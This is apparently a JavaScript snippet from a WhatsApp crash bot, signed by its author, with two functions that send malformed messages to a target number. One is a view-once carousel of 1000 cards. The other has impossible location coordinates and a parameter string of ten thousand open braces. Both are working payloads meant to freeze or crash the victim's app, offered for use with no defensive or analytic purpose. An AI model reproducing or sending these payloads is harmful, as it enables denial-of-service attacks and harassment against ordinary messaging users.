//created by  ⸙ꠋ𝕽𝖆𝖛𝖊𝖓-𝓗𝓲𝓼𝓸𝓴𝓪

//FORCE1
async function VxzyFC(target) {
let cards = [];

for (let r = 0; r < 1000; r++) {
cards.push({
body: { text: '-always ⸙ꠋ𝕽𝖆𝖛𝖊𝖓-𝓗𝓲𝓼𝓸𝓴𝓪🐉' },
header: {
title: '-always ⸙ꠋ𝕽𝖆𝖛𝖊𝖓-𝓗𝓲𝓼𝓸𝓴𝓪🐉',
imageMessage: {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
mimetype: "image/jpeg",
fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
fileLength: "98",
height: 4,
width: 4,
mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
mediaKeyTimestamp: "1749728782"
},
hasMediaAttachment: true
},
nativeFlowMessage: {
messageParamsJson: '-always ⸙ꠋ𝕽𝖆𝖛𝖊𝖓-𝓗𝓲𝓼𝓸𝓴𝓪🐉',
buttons: [
{
name: "payment_info",
buttonParamsJson: {}
}
]
}
});
}

let msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
body: { text: '-always ⸙ꠋ𝕽𝖆𝖛𝖊𝖓-𝓗𝓲𝓼𝓸𝓴𝓪🐉' },
footer: { text: '-always ⸙ꠋ𝕽𝖆𝖛𝖊𝖓-𝓗𝓲𝓼𝓸𝓴𝓪🐉' },
carouselMessage: {
cards: cards
},
contextInfo: {
participant: "0@s.whatsapp.net",
quotedMessage: {},
remoteJid: "@s.whatsapp.net"
}
}
}
}
}, {});

await Verload.relayMessage(target, msg.message, {
participant: { jid: target },
messageId: msg.key.id
});
}
//COMBO SAMA FUNC DI BAWAH
async function VxzyFC(target) {
try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "-always ⸙ꠋ𝕽𝖆𝖛𝖊𝖓-𝓗𝓲𝓼𝓸𝓴𝓪🐉",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "-always ⸙ꠋ𝕽𝖆𝖛𝖊𝖓-𝓗𝓲𝓼𝓸𝓴𝓪🐉",
                address: "-always ⸙ꠋ𝕽𝖆𝖛𝖊𝖓-𝓗𝓲𝓼𝓸𝓴𝓪🐉",
              },
            },
            body: {
              text: "-always ⸙ꠋ𝕽𝖆𝖛𝖊𝖓-𝓗𝓲𝓼𝓸𝓴𝓪🐉",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await Verload.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}